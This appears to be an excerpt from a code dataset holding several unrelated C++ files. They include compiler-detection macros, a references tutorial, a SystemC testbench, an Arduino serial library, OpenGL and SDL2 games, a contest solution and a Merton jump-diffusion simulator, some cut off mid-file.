|| __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a versio is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCO",
    "// there are many applications of the refrences in c++. some are listed below.\n/*\n1.)Modify the passed parameters in a function\n2.)Avoiding a copy of large structures\n3.)In For Each Loop to modify all objects\n4.)For Each Loop to avoid the copy of objects\n*/\n\n// 1. Modify the passed parameters in a function: \n#include<iostream>\n#include<string>\nusing namespace std;\n void swap(int& num1, int& num2){\n    int temp=num1;\n    num1=num2;\n    num2=temp;\n }\n\nint main1(){\n    int num1=100, num2=123;\n    std::cout<<num1<<\" \"<<num2;\n    swap(num1, num2);\n    std::cout<<num1<<\" \"<<num2;\n}\n\n//  2. Avoiding a copy of large structures: \n\n//Imagine a function that has to receive a large object. If we pass it without reference, a new copy \n// of it is created which causes a waste of CPU time and memory. We can use references to avoid this. \nstruct Student {\n    string name;\n    string address;\n    int rollNo;\n};\n// If we remove & in below function, a new\n// copy of the student object is created. \n// We use const to avoid accidental updates\n// in the function as the purpose of the function\n// is to print s only.\nvoid print(const Student &s)\n{\n    cout << s.name << \"  \" << s.address << \"  \" << s.rollNo\n         << '\\n';\n}\n// to better understand the above see the 22.cpp",
    "/*****************************************************************************\n\n  Licensed to Accellera Systems Initiative Inc. (Accellera) under one or\n  more contributor license agreements.  See the NOTICE file distributed\n  with this work for additional information regarding copyright ownership.\n  Accellera licenses this file to you under the Apache License, Version 2.0\n  (the \"License\"); you may not use this file except in compliance with the\n  License.  You may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an \"AS IS\" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n  implied.  See the License for the specific language governing\n  permissions and limitations under the License.\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  main.cpp -- \n\n  Original Author: Martin Janssen, Synopsys, Inc., 2002-02-15\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  MODIFICATION LOG - modifiers, enter your name, affiliation, date and\n  changes you are making here.\n\n      Name, Affiliation, Date:\n  Description of Modification:\n\n *****************************************************************************/\n\n// Main routine\n \n#include \"test.h\"\n#include \"tb.h\"\n#include \"monitor.h\"\n#include \"define.h\"\n \nint sc_main(int ac, char *av[])\n{\n  sc_clock clock(\"Clock\", CLOCK_PERIOD, SC_NS, DUTY_CYCLE, 0, SC_NS);\n  sc_clock tb_clock(\"TBClock\", TB_CLOCK_PERIOD, SC_NS, DUTY_CYCLE, 0, SC_NS);\n  sc_clock mon_clock(\"MonClock\", CLOCK_PERIOD, SC_NS, DUTY_CYCLE, 75, SC_NS);\n \n  sc_signal<bool> reset_sig;\n\n  sc_signal<int> i1;\n  sc_signal<int> i2;\n  sc_signal<int> i3;\n  sc_signal<int> i4;\n  sc_signal<int> i5;\n  \n  sc_signal<bool> cont1;\n  sc_signal<bool> cont2;\n  sc_signal<bool> cont3;\n  \n  sc_signal<int> o1;\n  sc_signal<int> o2;\n  sc_signal<int> o3;\n  sc_signal<int> o4;\n  sc_signal<int> o5;\n\n  test TEST (\"TEST\", clock, reset_sig, i1, i2, i3, i4, i5,\n\t cont1, cont2, cont3, o1, o2, o3, o4, o5);\n  tb TB (\"TB\", tb_clock, reset_sig, i1, i2, i3, i4, i5,\n\t cont1, cont2, cont3, o1, o2, o3, o4, o5);\n  monitor MONITOR (\"MONITOR\", mon_clock, reset_sig, i1, i2, i3, i4, i5,\n\t cont1, cont2, cont3, o1, o2, o3, o4, o5);\n\n  // Simulation Run Control\n  sc_start();\n  return 0;\n}\n",
    "#include <iostream>\n#include <cmath>\n#include <chrono>\n#include <tuple>\n#include <optional>\n#include <print>\n\n#include <boost/program_options.hpp>\n\n#include \"parallel_integrator.hpp\"\n\nstatic std::optional<std::tuple<double, double, std::size_t>> get_options(int argc, char *argv[])\n{\n    namespace po = boost::program_options;\n\n    po::options_description desc{\"Allowed options\"};\n    desc.add_options()\n        (\"help\", \"Produce help message\")\n        (\"from\", po::value<double>(), \"Set the lower limit of integration\")\n        (\"to\", po::value<double>(), \"Set the upper limit of integration\")\n        (\"n-threads\", po::value<std::size_t>(), \"Set the number of threads to run the program on\");\n\n    po::variables_map vm;\n    po::store(po::parse_command_line(argc, argv, desc), vm);\n    po::notify(vm);\n\n    if (vm.count(\"help\"))\n    {\n        std::cout << desc << std::endl;\n        return std::nullopt;\n    }\n\n    double a;\n    if (vm.count(\"from\"))\n        a = vm[\"from\"].as<double>();\n    else\n    {\n        std::println(\"The lower limit of integration is not set. Abort\");\n        return std::nullopt;\n    }\n\n    double b;\n    if (vm.count(\"to\"))\n        b = vm[\"to\"].as<double>();\n    else\n    {\n        std::println(\"The upper limit of integration is not set. Abort\");\n        return std::nullopt;\n    }\n\n    std::size_t n_threads;\n    if (vm.count(\"n-threads\"))\n        n_threads = vm[\"n-threads\"].as<std::size_t>();\n    else\n    {\n        std::println(\"The number of threads is not set. Abort\");\n        return std::nullopt;\n    }\n\n    return std::tuple{a, b, n_threads};\n}\n\nint main(int argc, char *argv[])\n{\n    auto opts = get_options(argc, argv);\n    if (!opts.has_value())\n        return 0;\n\n    auto [a, b, n_threads] = opts.value();\n\n    parallel::Parallel_Integrator integrator{[](double x){ return std::sin(1 / x); }, 1e-8};\n\n    auto start = std::chrono::high_resolution_clock::now();\n    double I = integrator.integrate(a, b, n_threads);\n    auto finish = std::chrono::high_resolution_clock::now();\n\n    using ms = std::chrono::milliseconds;\n\n    std::println(\"Computation on {} threads took {} ms\\n    I = {}\",\n                 n_threads, std::chrono::duration_cast<ms>(finish - start).count(), I);\n\n    return 0;\n}\n",
    "/*\n----------------------------------------------------------------------------\n\nThis file is part of the Sanworks ArCOM repository\nCopyright (C) 2016 Sanworks LLC, Sound Beach, New York, USA\n\n----------------------------------------------------------------------------\n\nThis program is free software: you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation, version 3.\n\nThis program is distributed  WITHOUT ANY WARRANTY and without even the \nimplied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  \nSee the GNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program.  If not, see <http://www.gnu.org/licenses/>.\n\n*/\n#include <Arduino.h>\n#include \"ArCOM.h\"\n\nArCOM::ArCOM(Stream &s) {\n  ArCOMstream = &s;  // Sets the interface (Serial, Serial1, SerialUSB, etc.)\n}\nunsigned int ArCOM::available() {\n  return ArCOMstream->available();\n}\nvoid ArCOM::flush() {\n  ArCOMstream->flush();\n}\nvoid ArCOM::writeByte(byte byte2Write) {\n  ArCOMstream->write(byte2Write);\n}\nvoid ArCOM::writeUint8(byte byte2Write) {\n  ArCOMstream->write(byte2Write);\n}\nvoid ArCOM::writeChar(char char2Write) {\n  ArCOMstream->write(char2Write);\n}\nvoid ArCOM::writeUint16(uint16_t int2Write) {\n    typeBuffer.uint16 = int2Write;\n    ArCOMstream->write(typeBuffer.byteArray, 2);\n}\n\nvoid ArCOM::writeUint32(uint32_t int2Write) {\n    typeBuffer.uint32 = int2Write;\n    ArCOMstream->write(typeBuffer.byteArray, 4);\n}\nbyte ArCOM::readByte(){\n  while (ArCOMstream->available() == 0) {}\n  return ArCOMstream->read();\n}\nbyte ArCOM::readUint8(){\n  while (ArCOMstream->available() == 0) {}\n  return ArCOMstream->read();\n}\nchar ArCOM::readChar(){\n  while (ArCOMstream->available() == 0) {}\n  return ArCOMstream->read();\n}\nunsigned short ArCOM::readUint16() {\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[0] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[1] = ArCOMstream->read();\n  return typeBuffer.uint16;\n}\n\nunsigned long ArCOM::readUint32() {\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[0] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[1] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[2] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[3] = ArCOMstream->read();\n  return typeBuffer.uint32;\n}\n\nfloat ArCOM::readFloat() {\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[0] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[1] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[2] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[3] = ArCOMstream->read();\n  return typeBuffer.floatVal;\n}\n\nvoid ArCOM::writeInt8(int8_t int2Write) {\n  typeBuffer.int8 = int2Write;\n  ArCOMstream->write(typeBuffer.byteArray[0]);\n}\n\nvoid ArCOM::writeInt16(int16_t int2Write) {\n  typeBuffer.int16 = int2Write;\n  ArCOMstream->write(typeBuffer.byteArray[0]);\n  ArCOMstream->write(typeBuffer.byteArray[1]);\n}\n\nvoid ArCOM::writeInt32(int32_t int2Write) {\n  typeBuffer.int32 = int2Write;\n  ArCOMstream->write(typeBuffer.byteArray[0]);\n  ArCOMstream->write(typeBuffer.byteArray[1]);\n  ArCOMstream->write(typeBuffer.byteArray[2]);\n  ArCOMstream->write(typeBuffer.byteArray[3]);\n}\n\nvoid ArCOM::writeFloat(float float2Write) {\n  typeBuffer.floatVal = float2Write;\n  ArCOMstream->write(typeBuffer.byteArray[0]);\n  ArCOMstream->write(typeBuffer.byteArray[1]);\n  ArCOMstream->write(typeBuffer.byteArray[2]);\n  ArCOMstream->write(typeBuffer.byteArray[3]);\n}\n\nint8_t ArCOM::readInt8() {\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[0] = ArCOMstream->read();\n  return typeBuffer.int8;\n}\nint16_t ArCOM::readInt16() {\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[0] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[1] = ArCOMstream->read();\n  return typeBuffer.int16;\n}\nint32_t ArCOM::readInt32() {\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[0] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[1] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[2] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[3] = ArCOMstream->read();\n  return typeBuffer.int32;\n}\nvoid ArCOM::writeByteArray(byte numArray[], unsigned int nValues) {\n  ArCOMstream->write(numArray, nValues);\n}\nvoid ArCOM::writeUint8Array(byte numArray[], unsigned int nValues) {\n  ArCOMstream->write(numArray, nValues);\n}\nvoid ArCOM::writeCharArray(char charArray[], unsigned int nValues) {\n  ArCOMstream->write(charArray, nValues);\n}\nvoid ArCOM::writeInt8Array(int8_t numArray[], ",
    "/*Juego Snake Proyecto LPOO\r\nSe ve como puntitos la serpiente y avansa sober las lineas del mapa*/\r\n\r\n#include <iostream>\r\n#include <GL/glut.h> //Libreria para OpenGL\r\n#include <vector> \r\n#include <cstdlib> // Para rand()\r\n#include <time.h>//Funcion tiempo para agarar semilla nueva\r\nusing namespace std;\r\n\r\n//Variables globales\r\nconst int tamanio = 12; // Tama\ufffdo de la matriz\r\nconst int velocidad = 900; //Velocidad que va a tener la serpiente \r\n\r\nclass Snake //Clase de la serpiente con todas sus caracteristicas\r\n{\r\npublic:\r\n    vector<pair<int, int>> segmentos;\r\n    int direccion; // Direccion de la serpiente\r\n\r\n    //Constructor\r\n    Snake()\r\n    {\r\n        segmentos.push_back(make_pair(tamanio / 2, tamanio / 2)); //Donde va a comenzar la serpiente\r\n    }\r\n//Suma numeros para mover de posicion\r\n    void movimientoSnake(bool crecer)\r\n    {\r\n        int posicionX = segmentos.front().first;\r\n        int posicionY = segmentos.front().second;\r\n\r\n        switch (direccion)\r\n        {\r\n        case 1: // Derecha\r\n            posicionX++;\r\n            break;\r\n\r\n        case 2: // Izquierda\r\n            posicionX--;\r\n            break;\r\n\r\n        case 3: // Arriba\r\n            posicionY++;\r\n            break;\r\n\r\n        case 4: // Abajo\r\n            posicionY--;\r\n            break;\r\n        }\r\n\r\n      // Marca la posicion nueva de la cabesa\r\n        segmentos.insert(segmentos.begin(), make_pair(posicionX, posicionY));\r\n\r\n        // Quita el ultimo segmento si no crese\r\n        if (!crecer) {\r\n            segmentos.pop_back();\r\n        }\r\n    }\r\n\r\n    //Para que el movimiento de la serpiente no le lleve la contraria, o sea, que no se equivoque de direccion\r\n    void setDireccion(int dir) {\r\n        if ((dir == 1 && direccion != 2) || (dir == 2 && direccion != 1) ||\r\n            (dir == 3 && direccion != 4) || (dir == 4 && direccion != 3)) {\r\n            direccion = dir;\r\n        }\r\n    }\r\n\r\n    //Funcion para dibujar a la serpiente\r\n    void dibujarSerpiente()\r\n    {\r\n        //El color que va a tener\r\n        glColor3f(0.0, 0.0, 0.0); // Color serpiente\r\n        glPointSize(10); //Tamanio de la serpiente\r\n\r\n        glBegin(GL_POINTS);\r\n        for (const auto& segmento : segmentos)\r\n        {\r\n            glVertex2i(segmento.first, segmento.second);\r\n        }\r\n    }\r\n\r\n};\r\n\r\nSnake serpiente; //Personaje de la serpiente\r\n\r\npair<int, int> comidaPos;\r\n\r\nvoid generarComida() {\r\n    srand(time(NULL));\r\n    comidaPos.first = rand() % tamanio;\r\n    comidaPos.second = rand() % tamanio;\r\n}\r\n\r\nvoid myDisplay() //Funcion para poder desplegar la ventana Menu\r\n{\r\n    glClear(GL_COLOR_BUFFER_BIT);\r\n\r\n    glutSwapBuffers();\r\n}\r\n\r\nvoid tiempo(int valor)\r\n{\r\n    serpiente.movimientoSnake(false); // Para que no crezca\r\n\r\n    // choque con de la serpiente\r\n    for (size_t i = 1; i < serpiente.segmentos.size(); ++i) {\r\n        if (serpiente.segmentos.front() == serpiente.segmentos[i]) {\r\n            cout << \" == Game Over==\" << endl;\r\n            exit(0);\r\n        }\r\n    }\r\n\r\n    // choque con de la pared\r\n    if (serpiente.segmentos.front().first < 0 || serpiente.segmentos.front().first >= tamanio ||\r\n        serpiente.segmentos.front().second < 0 || serpiente.segmentos.front().second >= tamanio) {\r\n        cout << \"==Game Over==\" << endl;\r\n        exit(0);\r\n    }\r\n\r\n    // choque con de la comida\r\n    if (serpiente.segmentos.front() == comidaPos) {\r\n        serpiente.movimientoSnake(true); // Para que crezca\r\n\r\n        generarComida(); // Genera nueva comida\r\n    }\r\n\r\n    glutPostRedisplay();\r\n    glutTimerFunc(velocidad / serpiente.segmentos.size(), tiempo, 0); // Velocidad de acuerdo con tamanio\r\n}\r\n\r\n\r\n//Teclas con mayusculas\r\nvoid teclasSerpiente(unsigned char teclado, int x, int y) {\r\n    switch (teclado) {\r\n    case 'w':\r\n        serpiente.setDireccion(3); // Arriba\r\n        break;\r\n    case 'a':\r\n        if (serpiente.direccion != 1 && serpiente.segmentos.front().first > 0)\r\n            serpiente.setDireccion(2); // Izquierda\r\n        break;\r\n    case 's':\r\n        serpiente.setDireccion(4); // Abajo\r\n        break;\r\n    case 'd':\r\n        if (serpiente.direccion != 2 && serpiente.segmentos.front().first < tamanio - 1)\r\n            serpiente.setDireccion(1); // Derecha\r\n        break;\r\n    case 'W':\r\n        serpiente.setDireccion(3); // Arriba\r\n        break;\r\n    case 'A':\r\n        if (serpiente.direccion != 1 && serpiente.segmentos.front().first > 0)\r\n            serpiente.setDireccion(2); // Izquierda\r\n        break;\r\n    case 'S':\r\n        serpiente.setDireccion(4); // Abajo\r\n        break;\r\n    case 'D':\r\n        if (serpiente.direccion != 2 && serpiente.segmentos.front().first < tamanio - 1)\r\n            serpiente.setDireccion(1); // Derecha\r\n        break;\r\n    }\r\n}\r\n//Es para el alt+F4\r\nvoid Teclado_EXP(int Tecla, int x, int y)\r\n{\r\n    if (Tecla == GLUT_KEY_F4)\r\n    {\r\n        cout << \"There is no hope. Nor will there be an escape. :)\" << endl;\r\n        exit(x);\r\n    }\r\n\r\n}\r\n\r\nvoid myInit() { //Funcion para establecer",
    "#include<bits/stdc++.h>\r\n#include<SDL2/SDL.h>\r\n#include<SDL2/SDL_image.h>\r\n#include<SDL2/SDL_ttf.h>\r\n\r\n#include\"class.h\"\r\n#include\"board.h\"\r\n#include\"useForAll.h\"\r\n#include\"loseAndWin.h\"\r\n#include\"newGameButton.h\"\r\n#include\"score.h\"\r\n\r\nusing namespace std; \r\n\r\n\r\nvoid start()\r\n{\r\n    setUpBoard();\r\n\r\n    block0.val = 0;\r\n    block0.update();\r\n\r\n    generate();\r\n    drawBoard();\r\n    updateBoard();\r\n\r\n    SDL_Event e;\r\n    bool quit = 0;\r\n    while(!quit)\r\n    {\r\n        while(SDL_PollEvent(&e))\r\n        {\r\n            if(e.type == SDL_QUIT) \r\n            {\r\n                quit = 1;\r\n                lBest.save();\r\n            }\r\n            checkLose();\r\n            blockMovement(e);\r\n            newButton.event(e);\r\n        }\r\n\r\n        if(restart) makeNewGame();\r\n        drawBoard();\r\n        updateBoard();\r\n\r\n        if(!lose) SDL_RenderPresent(gRenderer);\r\n        else printLoseScreen(); \r\n    }\r\n}\r\n\r\n\r\nvoid init()\r\n{\r\n    if(SDL_Init(SDL_INIT_EVERYTHING)) cout << \"fail\";\r\n    gWindow = SDL_CreateWindow(\"2048\", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, \r\n                                WINDOW_WIDTH, WINDOW_HEIGHT, SDL_WINDOW_SHOWN);\r\n    \r\n    gRenderer = SDL_CreateRenderer(gWindow, -1, SDL_RENDERER_ACCELERATED|SDL_RENDERER_PRESENTVSYNC);\r\n    IMG_Init(IMG_INIT_PNG);\r\n    TTF_Init();\r\n}\r\n\r\n\r\nvoid close()\r\n{\r\n    SDL_Quit();\r\n    IMG_Quit();\r\n    TTF_Quit();\r\n}\r\n\r\n\r\nvoid loadMedia()\r\n{\r\n    SDL_Surface* tmpSurface = NULL;\r\n    for(int i = 0; i <= 10; i++)\r\n    {\r\n        stringstream s(\"\");\r\n        s << \"images/\" << (1 << i) << \".png\";\r\n        tmpSurface = IMG_Load(s.str().c_str());\r\n\r\n        value[i] = SDL_CreateTextureFromSurface(gRenderer, tmpSurface);\r\n    }\r\n\r\n    tmpSurface = IMG_Load(\"images/background.png\");\r\n    background = SDL_CreateTextureFromSurface(gRenderer, tmpSurface);\r\n\r\n    SDL_FreeSurface(tmpSurface);\r\n\r\n\r\n    loadLoseAndWinScreen();\r\n    newButton.imgLoad();\r\n    lBest.imgLoad(\"images/best.png\");\r\n    lScore.imgLoad(\"images/score.png\");\r\n\r\n\r\n    font = TTF_OpenFont(\"images/font1.ttf\", 35);\r\n\r\n    ifstream getBestScore(\"images/scoreSave.txt\");\r\n    getBestScore >> best;\r\n    getBestScore.close();\r\n}\r\n\r\n\r\nint main(int argv, char* argc[])\r\n{\r\n    srand(time(0));\r\n    init();\r\n    loadMedia();\r\n\r\n    start();\r\n    close();\r\n\r\n    return 0;\r\n}",
    "#include <bits/stdc++.h>\n\n#define ll long long\n#define pii pair<int, int> \n#define pll pair<ll, ll>\n#define all(x) (x).begin(), (x).end()\nusing namespace std;\n\nvoid init() {\n    \n}\n\nvoid solve() {\n    int n, D;\n    cin >> n >> D;\n    vector<int> k(n + 1), s(n + 1);\n    for (int i = 1; i <= n; i++) cin >> k[i] >> s[i];\n    auto suf = k;\n    suf.push_back(0);\n    for (int i = n; i >= 1; i--) suf[i] = max(suf[i], suf[i + 1]);\n    vector<vector<int>> pos(D + 1);\n    set<array<int, 4>> st;\n    int ans = -1, cur = 1;\n    \n    for (int i = 1; i <= D; i++) {\n        if (!st.empty() && prev(st.end()) -> at(0) > suf[cur]) {\n            auto [pri, tim, s, id] = *prev(st.end());\n            s = -s;\n            st.erase(prev(st.end()));\n            if (i + s < D) pos[i + s].push_back(id);\n        } else {\n            int id = cur++;\n            if (i + s[id] < D) pos[i + s[id]].push_back(id);\n        }\n\n        if (cur == n + 1) {\n            ans = i;\n            break;\n        }\n\n        for (auto id : pos[i]) {\n            st.insert({k[id], -i, -s[id], id});\n        }  \n    }\n    \n    cout << ans << '\\n';\n}\n\nint main() {\n    ios::sync_with_stdio(0);\n    cin.tie(0); cout.tie(0);\n    int t;\n    cin >> t;\n    while(t --) {\n        init();\n        solve();\n    }\n    return 0;\n}\n\n/*\n\u95ee\u9898\uff1a\u7ed9\u5b9an\u4e2a\u6392\u6210\u4e00\u961f\u7684\u5b66\u751f\u4ee5\u53ca\u6bcf\u4e2a\u5b66\u751f\u7684\u4f18\u5148\u5ea6k\uff0c\u5403\u996d\u6240\u7528\u65f6\u95f4s\uff0c\u7a97\u53e3\u4f1a\u5728\u6bcf\u5206\u949f\u5f00\u59cb\u65f6\u7ed9\u961f\u5934\u5b66\u751f\u6253\u996d\uff0c\u5047\u8bbe\u6253\u996d\u65f6\u95f4\u4e3ax\uff0c\u6bcf\u4e2a\u5b66\u751f\u5728\u7b2cx + s\u5206\u949f\u7ed3\u675f\u65f6\u56de\u5230\u961f\u4f0d\uff0c\u5e76\u4e14\u4f1a\u5411\u524d\u63d2\u961f\uff0c\u76f4\u5230\u67d0\u4e2a\u5b66\u751f\u7684k\u503c\u4e0d\u5c0f\u4e8e\u4ed6\uff0c\n        \u95ee\u6700\u5c11\u591a\u5c11\u5206\u949f\u540e\u6240\u6709\u5b66\u751f\u90fd\u80fd\u5403\u4e0a\u4e00\u904d\u996d\uff0c\u82e5\u7b54\u6848\u5927\u4e8eD\uff0c\u90a3\u4e48\u8f93\u51fa-1\n\u601d\u8def\uff1a\u7528set\u5b58\u50a8\u5df2\u7ecf\u5403\u8fc7\u4e00\u6b21\u996d\u4e14\u51fa\u961f\u7684\u5b66\u751f\u7684k\u503c\uff0c\u6253\u996d\u7684\u65f6\u95f4\uff0c\u5403\u996d\u7684\u65f6\u95f4\u4ee5\u53caid\uff0c\u7528cur\u6307\u5411\u672a\u5403\u8fc7\u996d\u7684\u961f\u5934\u4f4d\u7f6e\uff0c\u5e76\u4e14\u7528suf\u7ef4\u62a4\u540e\u7f00k\u503c\u6700\u5927\u503c\uff0c\n        \u90a3\u4e48\u6bcf\u6b21\u53ea\u9700\u8981\u6bd4\u8f83cur\u6307\u5411\u7684\u5b66\u751f\u4ee5\u53cast\u4e2d\u4f18\u5148\u5ea6\u6700\u9ad8\u7684\u5b66\u751f\u7684\u4f18\u5148\u5ea6\u5373\u53ef\uff0c\u5e76\u5728\u6700\u540e\u5c06\u8fd9\u4e00\u5206\u949f\u672b\u5c3e\u8fdb\u5165\u961f\u4f0d\u7684\u5b66\u751f\u52a0\u5165st\n*/",
    "#include \"MertonModel.h\"\n#include \"rv.h\"\n\nMertonModel::MertonModel(PseudoFactory& factory) : S0_(factory.GetS0()), r_(factory.Getr()), sigma_(factory.Getsig()), N_(factory.GetN()), T_(factory.GetT()), M_(factory.GetM()), uJ_(factory.GetUJ()), sigmaJ(factory.GetSigmaJ()), lambdaJ_(factory.GetLambdaJ())\n\n{\n\tnu_ = r_ - lambdaJ_ * (std::exp(uJ_ + 0.5 * sigmaJ * sigmaJ) - 1) - 0.5 * sigma_ * sigma_;\t//Martingale adjustment\n\n\tdt_ = factory.GetT() / factory.GetN();\n\n\tgenerator_ = factory.CreateRandomBase();\n\tpath_ = factory.CreateBrownianMotionPath();\n}\n\n\nEigen::MatrixXd MertonModel::simulate_paths(int start_idx, int end_idx, Eigen::MatrixXd& paths) const\n{\n\n\tunsigned seed = std::chrono::system_clock::now().time_since_epoch().count();\n\tgenerator_->SeedGenerator(seed);\n\tboost::mt19937 rng = generator_->GetGenerator();\n\n\tdouble sqrtdt = std::sqrt(dt_);\n\n\t// Simulate paths within the designated range\n\tfor (int i = start_idx; i < end_idx; ++i)\n\t{\n\t\tpaths(i, 0) = S0_; // Set initial price\n\n\t\tstd::vector<double> variates(N_);\n\n\n\t\t//Variates will be filled with sqrt(dt)*Z, Z is standard normal\n\t\tpath_->GeneratePath(variates, rng);\n\t\t\n\n\t\tfor (int j = 0; j < N_; ++j)\n\t\t{\n\t\t\tdouble pj = rv::poisson_jumps(lambdaJ_*dt_);\n\t\t\tdouble jump_ = uJ_ * pj + sigmaJ * std::sqrt(pj);\n\n\t\t\t//std::cout << \"Variates: \" << variates[j] << std::endl;\n\t\t\tpaths(i, j + 1) = paths(i, j) * std::exp(nu_ * dt_ + sigma_ * sqrtdt * variates[j] + jump_);\n\n\t\t}\n\n\t\tif ((i + 1) % 200000 == 